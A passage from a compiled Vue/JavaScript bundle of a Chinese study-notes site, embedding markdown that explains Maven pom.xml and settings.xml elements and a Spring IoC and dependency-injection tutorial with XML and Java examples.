\r\n                    <groupId> org.springframework </groupId> \r\n                </exclusion> \r\n            </exclusions> \r\n\r\n            \x3c!-- 可选依赖，如果你在项目B中把C依赖声明为可选，你就需要在依赖于B的项目（例如项目A）中显式的引用对C的依赖。\r\n                 可选依赖阻断依赖的传递性。 --\x3e \r\n            <optional> true </optional> \r\n        </dependency> \r\n    </dependencies> \r\n\r\n    \x3c!-- 不赞成使用. 现在Maven忽略该元素. --\x3e \r\n    <reports></reports> \r\n\r\n    \x3c!-- 该元素描述使用报表插件产生报表的规范。当用户执行“mvn site”，这些报表就会运行。 在页面导航栏能看到所有报表的链接。 --\x3e \r\n    <reporting> \r\n        \x3c!-- true，则，网站不包括默认的报表。这包括“项目信息”菜单中的报表。 --\x3e \r\n        <excludeDefaults /> \r\n\r\n        \x3c!-- 所有产生的报表存放到哪里。默认值是${project.build.directory}/site。 --\x3e \r\n        <outputDirectory /> \r\n\r\n        \x3c!-- 使用的报表插件和他们的配置。 --\x3e \r\n        <plugins> \r\n            \x3c!-- plugin元素包含描述报表插件需要的信息 --\x3e \r\n            <plugin> \r\n                \x3c!-- 报表插件在仓库里的group ID --\x3e \r\n                <groupId></groupId> \r\n                \x3c!-- 报表插件在仓库里的artifact ID --\x3e \r\n                <artifactId></artifactId> \r\n\r\n                \x3c!-- 被使用的报表插件的版本（或版本范围） --\x3e \r\n                <version></version> \r\n\r\n                \x3c!-- 任何配置是否被传播到子项目 --\x3e \r\n                <inherited>true/false</inherited> \r\n\r\n                \x3c!-- 报表插件的配置 --\x3e \r\n                <configuration></configuration> \r\n\r\n                \x3c!-- 一组报表的多重规范，每个规范可能有不同的配置。一个规范（报表集）对应一个执行目标 。例如，\r\n                     有1，2，3，4，5，6，7，8，9个报表。1，2，5构成A报表集，对应一个执行目标。2，5，8构成B报\r\n                     表集，对应另一个执行目标 --\x3e \r\n                <reportSets> \r\n                    \x3c!-- 表示报表的一个集合，以及产生该集合的配置 --\x3e \r\n                    <reportSet> \r\n                        \x3c!-- 报表集合的唯一标识符，POM继承时用到 --\x3e \r\n                        <id></id> \r\n\r\n                        \x3c!-- 产生报表集合时，被使用的报表的配置 --\x3e \r\n                        <configuration></configuration> \r\n\r\n                        \x3c!-- 配置是否被继承到子POMs --\x3e \r\n                        <inherited>true/false</inherited> \r\n\r\n                        \x3c!-- 这个集合里使用到哪些报表 --\x3e \r\n                        <reports></reports> \r\n                    </reportSet> \r\n                </reportSets> \r\n            </plugin> \r\n        </plugins> \r\n    </reporting> \r\n\r\n    \x3c!-- 继承自该项目的所有子项目的默认依赖信息。这部分的依赖信息不会被立即解析,而是当子项目声明一个依赖\r\n        （必须描述group ID和artifact ID信息），如果group ID和artifact ID以外的一些信息没有描述，则通过\r\n            group ID和artifact ID匹配到这里的依赖，并使用这里的依赖信息。 --\x3e \r\n    <dependencyManagement> \r\n        <dependencies> \r\n            \x3c!-- 参见dependencies/dependency元素 --\x3e \r\n            <dependency> \r\n            </dependency> \r\n        </dependencies> \r\n    </dependencyManagement> \r\n\r\n    \x3c!-- 项目分发信息，在执行mvn deploy后表示要发布的位置。有了这些信息就可以把网站部署到远程服务器或者\r\n         把构件部署到远程仓库。 --\x3e \r\n    <distributionManagement> \r\n        \x3c!-- 部署项目产生的构件到远程仓库需要的信息 --\x3e \r\n        <repository> \r\n            \x3c!-- 是分配给快照一个唯一的版本号（由时间戳和构建流水号）？还是每次都使用相同的版本号？参见\r\n                 repositories/repository元素 --\x3e \r\n            <uniqueVersion /> \r\n            <id> banseon-maven2 </id> \r\n            <name> banseon maven2 </name> \r\n            <url> file://${basedir}/target/deploy </url> \r\n            <layout></layout> \r\n        </repository> \r\n\r\n        \x3c!-- 构件的快照部署到哪里？如果没有配置该元素，默认部署到repository元素配置的仓库，参见\r\n             distributionManagement/repository元素 --\x3e \r\n        <snapshotRepository> \r\n            <uniqueVersion /> \r\n            <id> banseon-maven2 </id> \r\n            <name> Banseon-maven2 Snapshot Repository </name> \r\n            <url> scp://svn.baidu.com/banseon:/usr/local/maven-snapshot </url> \r\n            <layout></layout>\r\n        </snapshotRepository> \r\n\r\n        \x3c!-- 部署项目的网站需要的信息 --\x3e \r\n        <site> \r\n            \x3c!-- 部署位置的唯一标识符，用来匹配站点和settings.xml文件里的配置 --\x3e \r\n            <id> banseon-site </id> \r\n\r\n            \x3c!-- 部署位置的名称 --\x3e \r\n            <name> business api website </name> \r\n\r\n            \x3c!-- 部署位置的URL，按protocol://hostname/path形式 --\x3e \r\n            <url> \r\n                scp://svn.baidu.com/banseon:/var/www/localhost/banseon-web \r\n            </url> \r\n        </site> \r\n\r\n        \x3c!-- 项目下载页面的URL。如果没有该元素，用户应该参考主页。使用该元素的原因是：帮助定位\r\n             那些不在仓库里的构件（由于license限制）。 --\x3e \r\n        <downloadUrl /> \r\n\r\n        \x3c!-- 如果构件有了新的group ID和artifact ID（构件移到了新的位置），这里列出构件的重定位信息。 --\x3e \r\n        <relocation> \r\n            \x3c!-- 构件新的group ID --\x3e \r\n            <groupId></groupId> \r\n\r\n            \x3c!-- 构件新的artifact ID --\x3e \r\n            <artifactId></artifactId> \r\n\r\n            \x3c!-- 构件新的版本号 --\x3e \r\n            <version></version> \r\n\r\n            \x3c!-- 显示给用户的，关于移动的额外信息，例如原因。 --\x3e \r\n            <message></message> \r\n        </relocation> \r\n\r\n        \x3c!-- 给出该构件在远程仓库的状态。不得在本地项目中设置该元素，因为这是工具自动更新的。有效的值\r\n             有：none（默认），converted（仓库管理员从Maven 1 POM转换过来），partner（直接从伙伴Maven \r\n             2仓库同步过来），deployed（从Maven 2实例部署），verified（被核实时正确的和最终的）。 --\x3e \r\n        <status></status> \r\n    </distributionManagement> \r\n\r\n    \x3c!-- 以值替代名称，Properties可以在整个POM中使用，也可以作为触发条件（见settings.xml配置文件里\r\n         activation元素的说明）。格式是<name>value</name>。 --\x3e \r\n    <properties>\r\n        <name>value</name>\r\n    </properties> \r\n</project> \r\n```\r\n\r\n\r\n\r\n# 附件2：POM文件单项配置说明\r\n\r\n## localRepository\r\n\r\n```XML\r\n \x3c!-- 本地仓库的路径。默认值为${user.home}/.m2/repository。 --\x3e\r\n <localRepository>usr/local/maven</localRepository>\r\n```\r\n\r\n## interactiveMode\r\n\r\n```XML\r\n \x3c!--Maven是否需要和用户交互以获得输入。如果Maven需要和用户交互以获得输入，则设置成true，反之则应为false。默认为true。--\x3e\r\n <interactiveMode>true</interactiveMode>\r\n```\r\n\r\n## usePluginRegistry\r\n\r\n```XML\r\n\x3c!--Maven是否需要使用plugin-registry.xml文件来管理插件版本。如果需要让Maven使用文件${user.home}/.m2/plugin-registry.xml来管理插件版本，则设为true。默认为false。--\x3e\r\n <usePluginRegistry>false</usePluginRegistry>\r\n```\r\n\r\n## offline\r\n\r\n```XML\r\n \x3c!--表示Maven是否需要在离线模式下运行。如果构建系统需要在离线模式下运行，则为true，默认为false。当由于网络设置原因或者安全因素，构建服务器不能连接远程仓库的时候，该配置就十分有用。 --\x3e\r\n <offline>false</offline>\r\n```\r\n\r\n## pluginGroups\r\n\r\n```XML\r\n\x3c!--当插件的组织Id（groupId）没有显式提供时，供搜寻插件组织Id（groupId）的列表。该元素包含一个pluginGroup元素列表，每个子元素包含了一个组织Id（groupId）。当我们使用某个插件，并且没有在命令行为其提供组织Id（groupId）的时候，Maven就会使用该列表。默认情况下该列表包含了org.apache.maven.plugins和org.codehaus.mojo --\x3e\r\n <pluginGroups>\r\n  \x3c!--plugin的组织Id（groupId） --\x3e\r\n  <pluginGroup>org.codehaus.mojo</pluginGroup>\r\n </pluginGroups>\r\n```\r\n\r\n## proxies\r\n\r\n```XML\r\n\x3c!--用来配置不同的代理，多代理profiles 可以应对笔记本或移动设备的工作环境：通过简单的设置profile id就可以很容易的更换整个代理配置。 --\x3e\r\n <proxies>\r\n  \x3c!--代理元素包含配置代理时需要的信息--\x3e\r\n  <proxy>\r\n   \x3c!--代理的唯一定义符，用来区分不同的代理元素。--\x3e\r\n   <id>myproxy</id>\r\n   \x3c!--该代理是否是激活的那个。true则激活代理。当我们声明了一组代理，而某个时候只需要激活一个代理的时候，该元素就可以派上用处。 --\x3e\r\n   <active>true</active>\r\n   \x3c!--代理的协议。 协议://主机名:端口，分隔成离散的元素以方便配置。--\x3e\r\n   <protocol>http</protocol>\r\n   \x3c!--代理的主机名。协议://主机名:端口，分隔成离散的元素以方便配置。  --\x3e\r\n   <host>proxy.somewhere.com</host>\r\n   \x3c!--代理的端口。协议://主机名:端口，分隔成离散的元素以方便配置。 --\x3e\r\n   <port>8080</port>\r\n   \x3c!--代理的用户名，用户名和密码表示代理服务器认证的登录名和密码。 --\x3e\r\n   <username>proxyuser</username>\r\n   \x3c!--代理的密码，用户名和密码表示代理服务器认证的登录名和密码。 --\x3e\r\n   <password>somepassword</password>\r\n   \x3c!--不该被代理的主机名列表。该列表的分隔符由代理服务器指定；例子中使用了竖线分隔符，使用逗号分隔也很常见。--\x3e\r\n   <nonProxyHosts>*.google.com|ibiblio.org</nonProxyHosts>\r\n  </proxy>\r\n </proxies>\r\n```\r\n\r\n## servers\r\n\r\n```XML\r\n\x3c!--配置服务端的一些设置。一些设置如安全证书不应该和pom.xml一起分发。这种类型的信息应该存在于构建服务器上的settings.xml文件中。--\x3e\r\n <servers>\r\n  \x3c!--服务器元素包含配置服务器时需要的信息 --\x3e\r\n  <server>\r\n   \x3c!--这是server的id（注意不是用户登陆的id），该id与distributionManagement中repository元素的id相匹配。--\x3e\r\n   <id>server001</id>\r\n   \x3c!--鉴权用户名。鉴权用户名和鉴权密码表示服务器认证所需要的登录名和密码。 --\x3e\r\n   <username>my_login</username>\r\n   \x3c!--鉴权密码 。鉴权用户名和鉴权密码表示服务器认证所需要的登录名和密码。密码加密功能已被添加到2.1.0 +。详情请访问密码加密页面--\x3e\r\n   <password>my_password</password>\r\n   \x3c!--鉴权时使用的私钥位置。和前两个元素类似，私钥位置和私钥密码指定了一个私钥的路径（默认是${user.home}/.ssh/id_dsa）以及如果需要的话，一个密语。将来passphrase和password元素可能会被提取到外部，但目前它们必须在settings.xml文件以纯文本的形式声明。 --\x3e\r\n   <privateKey>${usr.home}/.ssh/id_dsa</privateKey>\r\n   \x3c!--鉴权时使用的私钥密码。--\x3e\r\n   <passphrase>some_passphrase</passphrase>\r\n   \x3c!--文件被创建时的权限。如果在部署的时候会创建一个仓库文件或者目录，这时候就可以使用权限（permission）。这两个元素合法的值是一个三位数字，其对应了unix文件系统的权限，如664，或者775。 --\x3e\r\n   <filePermissions>664</filePermissions>\r\n   \x3c!--目录被创建时的权限。 --\x3e\r\n   <directoryPermissions>775</directoryPermissions>\r\n  </server>\r\n </servers>\r\n```\r\n\r\n## mirrors\r\n\r\n```XML\r\n\x3c!--为仓库列表配置的下载镜像列表。高级设置请参阅镜像设置页面 --\x3e\r\n <mirrors>\r\n  \x3c!--给定仓库的下载镜像。 --\x3e\r\n  <mirror>\r\n   \x3c!--该镜像的唯一标识符。id用来区分不同的mirror元素。 --\x3e\r\n   <id>planetmirror.com</id>\r\n   \x3c!--镜像名称 --\x3e\r\n   <name>PlanetMirror Australia</name>\r\n   \x3c!--该镜像的URL。构建系统会优先考虑使用该URL，而非使用默认的服务器URL。 --\x3e\r\n   <url>http://downloads.planetmirror.com/pub/maven2</url>\r\n   \x3c!--被镜像的服务器的id。例如，如果我们要设置了一个Maven中央仓库（http://repo.maven.apache.org/maven2/）的镜像，就需要将该元素设置成central。这必须和中央仓库的id central完全一致。--\x3e\r\n   <mirrorOf>central</mirrorOf>\r\n  </mirror>\r\n </mirrors>\r\n```\r\n\r\n## profiles\r\n\r\n```XML\r\n \x3c!--根据环境参数来调整构建配置的列表。settings.xml中的profile元素是pom.xml中profile元素的裁剪版本。它包含了id，activation, repositories, pluginRepositories和 properties元素。这里的profile元素只包含这五个子元素是因为这里只关心构建系统这个整体（这正是settings.xml文件的角色定位），而非单独的项目对象模型设置。如果一个settings中的profile被激活，它的值会覆盖任何其它定义在POM中或者profile.xml中的带有相同id的profile。 --\x3e\r\n <profiles>\r\n  \x3c!--根据环境参数来调整的构件的配置--\x3e\r\n  <profile>\r\n   \x3c!--该配置的唯一标识符。 --\x3e\r\n   <id>test</id>\r\n```\r\n\r\n## Activation\r\n\r\n```XML\r\n\x3c!--自动触发profile的条件逻辑。Activation是profile的开启钥匙。如POM中的profile一样，profile的力量来自于它能够在某些特定的环境中自动使用某些特定的值；这些环境通过activation元素指定。activation元素并不是激活profile的唯一方式。settings.xml文件中的activeProfile元素可以包含profile的id。profile也可以通过在命令行，使用-P标记和逗号分隔的列表来显式的激活（如，-P test）。--\x3e\r\n   <activation>\r\n    \x3c!--profile默认是否激活的标识--\x3e\r\n    <activeByDefault>false</activeByDefault>\r\n    \x3c!--当匹配的jdk被检测到，profile被激活。例如，1.4激活JDK1.4，1.4.0_2，而!1.4激活所有版本不是以1.4开头的JDK。--\x3e\r\n    <jdk>1.5</jdk>\r\n    \x3c!--当匹配的操作系统属性被检测到，profile被激活。os元素可以定义一些操作系统相关的属性。--\x3e\r\n    <os>\r\n     \x3c!--激活profile的操作系统的名字 --\x3e\r\n     <name>Windows XP</name>\r\n     \x3c!--激活profile的操作系统所属家族(如 \'windows\')  --\x3e\r\n     <family>Windows</family>\r\n     \x3c!--激活profile的操作系统体系结构  --\x3e\r\n     <arch>x86</arch>\r\n     \x3c!--激活profile的操作系统版本--\x3e\r\n     <version>5.1.2600</version>\r\n    </os>\r\n    \x3c!--如果Maven检测到某一个属性（其值可以在POM中通过${name}引用），其拥有对应的name = 值，Profile就会被激活。如果值字段是空的，那么存在属性名称字段就会激活profile，否则按区分大小写方式匹配属性值字段--\x3e\r\n    <property>\r\n     \x3c!--激活profile的属性的名称--\x3e\r\n     <name>mavenVersion</name>\r\n     \x3c!--激活profile的属性的值 --\x3e\r\n     <value>2.0.3</value>\r\n    </property>\r\n    \x3c!--提供一个文件名，通过检测该文件的存在或不存在来激活profile。missing检查文件是否存在，如果不存在则激活profile。另一方面，exists则会检查文件是否存在，如果存在则激活profile。--\x3e\r\n    <file>\r\n     \x3c!--如果指定的文件存在，则激活profile。 --\x3e\r\n     <exists>${basedir}/file2.properties</exists>\r\n     \x3c!--如果指定的文件不存在，则激活profile。--\x3e\r\n     <missing>${basedir}/file1.properties</missing>\r\n    </file>\r\n   </activation>\r\n```\r\n\r\n## Repositories\r\n\r\n```XML\r\n  \x3c!--远程仓库列表，它是Maven用来填充构建系统本地仓库所使用的一组远程项目。 --\x3e\r\n   <repositories>\r\n    \x3c!--包含需要连接到远程仓库的信息 --\x3e\r\n    <repository>\r\n     \x3c!--远程仓库唯一标识--\x3e\r\n     <id>codehausSnapshots</id>\r\n     \x3c!--远程仓库名称 --\x3e\r\n     <name>Codehaus Snapshots</name>\r\n     \x3c!--如何处理远程仓库里发布版本的下载--\x3e\r\n     <releases>\r\n      \x3c!--true或者false表示该仓库是否为下载某种类型构件（发布版，快照版）开启。  --\x3e\r\n      <enabled>false</enabled>\r\n      \x3c!--该元素指定更新发生的频率。Maven会比较本地POM和远程POM的时间戳。这里的选项是：always（一直），daily（默认，每日），interval：X（这里X是以分钟为单位的时间间隔），或者never（从不）。 --\x3e\r\n      <updatePolicy>always</updatePolicy>\r\n      \x3c!--当Maven验证构件校验文件失败时该怎么做-ignore（忽略），fail（失败），或者warn（警告）。--\x3e\r\n      <checksumPolicy>warn</checksumPolicy>\r\n     </releases>\r\n     \x3c!--如何处理远程仓库里快照版本的下载。有了releases和snapshots这两组配置，POM就可以在每个单独的仓库中，为每种类型的构件采取不同的策略。例如，可能有人会决定只为开发目的开启对快照版本下载的支持。参见repositories/repository/releases元素--\x3e\r\n     <snapshots>\r\n      <enabled/><updatePolicy/><checksumPolicy/>\r\n     </snapshots>\r\n     \x3c!--远程仓库URL，按protocol://hostname/path形式 --\x3e\r\n     <url>http://snapshots.maven.codehaus.org/maven2</url>\r\n     \x3c!--用于定位和排序构件的仓库布局类型-可以是default（默认）或者legacy（遗留）。Maven 2为其仓库提供了一个默认的布局；然而，Maven 1.x有一种不同的布局。我们可以使用该元素指定布局是default（默认）还是legacy（遗留）。 --\x3e\r\n     <layout>default</layout>\r\n    </repository>\r\n   </repositories>\r\n   \x3c!--发现插件的远程仓库列表。仓库是两种主要构件的家。第一种构件被用作其它构件的依赖。这是中央仓库中存储的大部分构件类型。另外一种构件类型是插件。Maven插件是一种特殊类型的构件。由于这个原因，插件仓库独立于其它仓库。pluginRepositories元素的结构和repositories元素的结构类似。每个pluginRepository元素指定一个Maven可以用来寻找新插件的远程地址。--\x3e\r\n   <pluginRepositories>\r\n    \x3c!--包含需要连接到远程插件仓库的信息.参见profiles/profile/repositories/repository元素的说明--\x3e\r\n          <pluginRepository>           \r\n     <releases>      \r\n      <enabled/><updatePolicy/><checksumPolicy/>\r\n     </releases>\r\n     <snapshots>\r\n      <enabled/><updatePolicy/><checksumPolicy/>\r\n     </snapshots>\r\n     <id/><name/><url/><layout/>\r\n          </pluginRepository>\r\n        </pluginRepositories>\r\n  </profile>\r\n </profiles>\r\n```\r\n\r\n## activeProfiles\r\n\r\n```XML\r\n\x3c!--手动激活profiles的列表，按照profile被应用的顺序定义activeProfile。 该元素包含了一组activeProfile元素，每个activeProfile都含有一个profile id。任何在activeProfile中定义的profile id，不论环境设置如何，其对应的\r\n        profile都会被激活。如果没有匹配的profile，则什么都不会发生。例如，env-test是一个activeProfile，则在pom.xml（或者profile.xml）中对应id的profile会被激活。如果运行过程中找不到这样一个profile，Maven则会像往常一样运行。 --\x3e\r\n   <activeProfiles>\r\n    <activeProfile>env-test</activeProfile>\r\n   </activeProfiles>\r\n</settings>\r\n```',ce={data:function(){return{MainComponent:le}}},pe=ce,ue=Object(u["a"])(pe,se,oe,!1,null,"432a16c9",null),me=ue.exports,de={mixins:[sr["a"]],components:{m1:ie,m2:me},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"maven 基础",value:"m1"},{label:"POM文件帮助文档",value:"m2"}]}}},ge=de,be=Object(u["a"])(ge,Xt,Yt,!1,null,"159cf718",null),ve=be.exports,he=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},Se=[],ye=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},fe=[],_e='\x3c!--\n * @Date           : 2021-04-28 01:12:51\n * @FilePath       : /jinnian-space/src/pages/java/module/springmvc/md/Spring-day01.md\n * @Description    : \n--\x3e\n#  IOC\n\n## 1)Spring简介\n\n### 1.1)什么是框架\n\n- 源自于建筑学，隶属土木工程，后发展到软件工程领域\n\n- 软件工程框架：经过验证的，具有一定功能的，半成品软件\n\n  - 经过验证\n\n  - 具有一定功能\n\n  - 半成品\n\n![1590631254933](./img/java/springmvc/Spring-day01/1590631254933.png)\n\n### 1.2)框架的作用\n\n![1590631300743](./img/java/springmvc/Spring-day01/1590631300743.png)\n\n### 1.3)Spring是什么\n\nSpring是分层的JavaSE/EE应用full-stack轻量级开源框架\n\n![1590631495077](./img/java/springmvc/Spring-day01/1590631495077.png)\n\n### 1.4)Spring的体系结构\n\n![1590631552693](./img/java/springmvc/Spring-day01/1590631552693.png)\n\n### 1.5)Spring的发展历史\n\n![1590631606747](./img/java/springmvc/Spring-day01/1590631606747.png)\n\n### 1.6)Spring优势\n\n| Spring的优势             |          |\n| ------------------------ | -------- |\n| 方便解耦，简化开发       | 第一天   |\n| 方便集成各种优秀框架     | 第一天   |\n| 方便程序的测试           | 第二天   |\n| AOP编程的支持            | 第三天   |\n| 声明式事务的支持         | 第四天   |\n| 降低JavaEE API的使用难度 | 第四天   |\n| Java源码是经典学习范例   | 长期学习 |\n\n## 2)IoC简介\n\n### 2.1)优质程序代码的制作原则\n\n![1590636507198](./img/java/springmvc/Spring-day01/1590636507198.png)\n\n### 2.2)耦合与内聚\n\n- 耦合（Coupling）：代码书写过程中所使用技术的结合紧密度，用于衡量软件中各个模块之间的互联程度\n\n- 内聚（Cohesion）：代码书写过程中单个模块内部各组成部分间的联系，用于衡量软件中各个功能模块内部的功能联系\n\n![1590636557953](./img/java/springmvc/Spring-day01/1590636557953.png)\n\n- 程序书写的目标：高内聚，低耦合\n  - 就是同一个模块内的各个元素之间要高度紧密，但是各个模块之间的相互依存度却不要那么紧密\n\n### 2.3)工厂模式发展史\n\n![1590636616069](./img/java/springmvc/Spring-day01/1590636616069.png)\n\n![1590636644096](./img/java/springmvc/Spring-day01/1590636644096.png)\n\n![1590636661026](./img/java/springmvc/Spring-day01/1590636661026.png)\n\n### 2.4)Spring发展历程\n\n![1590636704098](./img/java/springmvc/Spring-day01/1590636704098.png)\n\n### 2.5)IoC\n\n- IoC（Inversion Of Control）控制反转，Spring反向控制应用程序所需要使用的外部资源\n\n- Spring控制的资源全部放置在Spring容器中，该容器称为IoC容器\n\n  ![1590636750876](./img/java/springmvc/Spring-day01/1590636750876.png)\n\n\n\n\n\n## 3)入门案例\n\n### 3.1)案例环境说明\n\n- 模拟三层架构中表现层调用业务层功能\n\n  - 表现层：UserApp模拟UserServlet（使用main方法模拟）\n\n  - 业务层：UserService\n\n### 3.2)IoC入门案例制作步骤\n\n1.导入spring坐标（5.1.9.release）\n\n2.编写业务层与表现层（模拟）接口与实现类\n\n3.建立spring配置文件\n\n4.配置所需资源（Service）为spring控制的资源\n\n5.表现层（App）通过spring获取资源（Service实例）\n\n![1590637353510](./img/java/springmvc/Spring-day01/1590637353510.png)\n\n#### 3.2.1)IoC入门案例制作步骤-1\n\n```xml\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-context</artifactId>\n    <version>5.1.9.RELEASE</version>\n</dependency>\n```\n\n#### 3.2.2)IoC入门案例制作步骤-2\n\n```java\npublic interface UserService {\n\t//业务方法  \n\tvoid save();\n}\n```\n\n#### 3.2.3)IoC入门案例制作步骤-3\n\n```java\npublic class UserServiceImpl implements UserService {\n    public void save() {\n        System.out.println("user service running...");\n    }\n}\n```\n\n#### 3.2.4)IoC入门案例制作步骤-4\n\n```xml\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans\n        https://www.springframework.org/schema/beans/spring-beans.xsd">\n    \x3c!-- 1.创建spring控制的资源--\x3e\n    <bean id="userService" class="com.itheima.service.impl.UserServiceImpl"/>\n</beans>\n```\n\n#### 3.2.5)IoC入门案例制作步骤-5\n\n```java\npublic class UserApp {\n    public static void main(String[] args) {\n        //2.加载配置文件\n        ApplicationContext ctx = new ClassPathXmlApplicationContext("applicationContext.xml");\n        //3.获取资源\n        UserService userService = (UserService) ctx.getBean("userService");\n        userService.save();\n    }\n}\n```\n\n## 4)IoC配置（XML格式）\n\n### 4.1)bean\n\n- 名称：bean\n\n- 类型：**标签**\n\n- 归属：beans标签\n\n- 作用：定义spring中的资源，受此标签定义的资源将受到spring控制\n\n- 格式：\n\n  ```xml\n  <beans>\n  \t<bean />\n  </beans>\n  ```\n\n- 基本属性：\n\n  ```xml\n  <bean id="beanId" name="beanName1,beanName2" class="ClassName"></bean>\n  ```\n\n  ​\tid：bean的名称，通过id值获取bean\n\n  ​\tclass：bean的类型\n\n  ​\tname：bean的名称，可以通过name值获取bean，用于多人配合时给bean起别名\n\n### 4.2)bean属性scope\n\n- 名称：scope\n\n- 类型：**属性**\n\n- 归属：bean标签\n\n- 作用：定义bean的作用范围\n\n- 格式：\n\n  ```xml\n  <bean scope="singleton"></bean>\n  ```\n\n- 取值：\n\n  - singleton：设定创建出的对象保存在spring容器中，是一个单例的对象\n  - prototype：设定创建出的对象保存在spring容器中，是一个非单例的对象\n  - request、session、application、 websocket ：设定创建出的对象放置在web容器对应的位置\n\n### 4.3)bean生命周期\n\n- 名称：init-method，destroy-method\n\n- 类型：**属性**\n\n- 归属：bean标签\n\n- 作用：定义bean对象在初始化或销毁时完成的工作\n\n- 格式：\n\n  ```xml\n  <bean init-method="init" destroy-method="destroy></bean>\n  ```\n\n- 取值：bean对应的类中对应的具体方法名\n\n- 注意事项：\n\n  - 当scope=“singleton”时，spring容器中有且仅有一个对象，init方法在创建容器时仅执行一次\n\n  - 当scope=“prototype”时，spring容器要创建同一类型的多个对象，init方法在每个对象创建时均执行一次\n\n  - 当scope=“singleton”时，关闭容器会导致bean实例的销毁，调用destroy方法一次\n\n  - 当scope=“prototype”时，对象的销毁由垃圾回收机制gc()控制，destroy方法将不会被执行\n\n### 4.4)bean对象创建方式（了解）\n\n(1)factory-bean\n\n- 名称：factory-bean\n\n- 类型：**属性**\n\n- 归属：bean标签\n\n- 作用：定义bean对象创建方式，使用静态工厂的形式创建bean，兼容早期遗留系统的升级工作\n\n- 格式：\n\n  ```xml\n  <bean class="FactoryClassName" factory-method="factoryMethodName"></bean>\n  ```\n\n- 取值：工厂bean中用于获取对象的静态方法名\n\n- 注意事项：\n  \n  - class属性必须配置成静态工厂的类名\n\n(2)factory-bean，factory-method\n\n- 名称：factory-bean，factory-method\n\n- 类型：**属性**\n\n- 归属：bean标签\n\n- 作用：定义bean对象创建方式，使用实例工厂的形式创建bean，兼容早期遗留系统的升级工作\n\n- 格式：\n\n  ```xml\n  <bean factory-bean="factoryBeanId" factory-method="factoryMethodName"></bean>\n  ```\n\n- 取值：工厂bean中用于获取对象的实例方法名\n\n- 注意事项：\n\n  - 使用实例工厂创建bean首先需要将实例工厂配置bean，交由spring进行管理\n\n  - factory-bean是实例工厂的beanId\n\n### 4.5)DI\n\n- IoC（Inversion Of Control）控制翻转，Spring反向控制应用程序所需要使用的外部资源\n\n- DI（Dependency Injection）依赖注入，应用程序运行依赖的资源由Spring为其提供，资源进入应用程序的方式称为注入\n\n![1590659778689](./img/java/springmvc/Spring-day01/1590659778689.png)\n\nIoC与DI的关系\n\n- IoC与DI是同一件事站在不同角度看待问题\n\n- 半杯水\n\n- \n\n- \n\n  ![1590659854696](./img/java/springmvc/Spring-day01/1590659854696.png)set注入（主流）\n\n### 4.6)set注入（主流）\n\n- 名称：property\n\n- 类型：**标签**\n\n- 归属：bean标签\n\n- 作用：使用set方法的形式为bean提供资源\n\n- 格式：\n\n  ```java\n  <bean>\n  \t<property />\n  </bean>\n  ```\n\n- 基本属性：\n\n  ```xml\n  <property name="propertyName" value="propertyValue" ref="beanId"/>\n  ```\n\n​\tname：对应bean中的属性名，要求该属性必须提供可访问的set方法（严格规范为此名称是set方法对应名称）\n\n​\tvalue：设定非引用类型属性对应的值，不能与ref同时使用\n\n​\tref：设定引用类型属性对应bean的id ，不能与value同时使用\n\n- 注意：一个bean可以有多个property标签\n\n### 4.7)构造器注入（了解）\n\n- 名称：constructor-arg\n\n- 类型：**标签**\n\n- 归属：bean标签\n\n- 作用：使用构造方法的形式为bean提供资源，兼容早期遗留系统的升级工作\n\n- 格式：\n\n  ```xml\n  <bean>\n  \t<constructor-arg />\n  </bean>\n  ```\n\n- 基本属性：\n\n  ```xml\n  <constructor-arg name="argsName" value="argsValue />\n  ```\n\n​\tname：对应bean中的构造方法所携带的参数名\n\n​\tvalue：设定非引用类型构造方法参数对应的值，不能与ref同时使用\n\n其他属性：\n\n```xml\n<constructor-arg index="arg-index" type="arg-type" ref="beanId"/>\n```\n\n​\tref：设定引用类型构造方法参数对应bean的id ，不能与value同时使用\n\n​\ttype ：设定构造方法参数的类型，用于按类型匹配参数或进行类型校验\n\n​\tindex ：设定构造方法参数的位置，用于按位置匹配参数，参数index值从0开始计数\n\n- 注意：一个bean可以有多个constructor-arg标签\n\n### 4.8)集合类型数据注入\n\n- 名称：array，list，set，map，props\n\n- 类型：**标签**\n\n- 归属：property标签 或 constructor-arg标签\n\n- 作用：注入集合数据类型属性\n\n- 格式：\n\n  ```xml\n  <property>\n  \t<list></list>\n  </property>\n  ```\n\n(1)集合类型数据注入——list\n\n```xml\n<property name="al">\n    <list>\n        <value>itheima</value>\n        <value>66666</value>\n    </list>\n</property>\n```\n\n(2)集合类型数据注入——props\n\n```xml\n<property name="properties">\n    <props>\n        <prop key="name">itheima666</prop>\n        <prop key="value">666666</prop>\n    </props>\n</property>\n```\n\n(3)集合类型数据注入——array （了解）\n\n```xml\n<property name="arr">\n    <array>\n        <value>123456</value>\n        <value>66666</value>\n    </array>\n</property>\n```\n\n(4)集合类型数据注入——set（了解）\n\n```xml\n <property name="hs">\n     <set>\n         <value>itheima</value>\n         <value>66666</value>\n     </set>\n</property>\n```\n\n(5)集合类型数据注入——map（了解）\n\n```xml\n<property name="hm">\n    <map>\n        <entry key="name" value="itheima66666"/>\n        <entry key="value" value="6666666666"/>\n    </map>\n</property>\n```\n\n### 4.9)使用p命名空间简化配置（了解）\n\n- 名称：p:propertyName，p:propertyName-ref\n\n- 类型：**属性**\n\n- 归属：bean标签\n\n- 作用：为bean注入属性值\n\n- 格式：\n\n  ```xml\n  <bean p:propertyName="propertyValue" p:propertyName-ref="beanId"/>\n  ```\n\n- 注意：使用p命令空间需要先开启spring对p命令空间的的支持，在beans标签中添加对应空间支持\n\n  ```xml\n  <beans xmlns="http://www.springframework.org/schema/beans"    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"    xmlns:p="http://www.springframework.org/schema/p"       xsi:schemaLocation="http://www.springframework.org/schema/beans     https://www.springframework.org/schema/beans/spring-beans.xsd">\n  ```\n\n  后续课程中还将开启其他的命名空间，方式同上\n\n- 案例：\n\n  ```xml\n   <bean\n         id="userService"\n         class="com.itheima.service.impl.UserServiceImpl"\n         p:userDao-ref="userDao"\n         p:bookDao-ref="bookDao"\n         />\n  ```\n\n  \n\n### 